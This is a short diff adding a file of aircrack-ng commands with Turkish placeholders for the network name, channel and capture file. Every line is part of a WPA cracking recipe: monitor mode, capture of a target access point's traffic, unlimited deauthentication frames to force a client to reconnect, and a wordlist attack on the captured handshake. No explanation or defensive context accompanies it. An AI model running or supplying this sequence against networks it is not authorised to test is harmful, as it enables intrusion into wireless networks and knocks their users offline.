@@ -1,0 +1,6 @@
+
+airmon-ng start wlan0
+airodump-ng mon0
+airodump-ng -w "wifiismi" --encrypt wpa -c "yayın yaptığı kanal" --bssid "BSSID"
+aireplay-ng -0 0 -a bssid -c station mon0 --ignore
+aircrack-ng -w ./wordlist isim.pcap
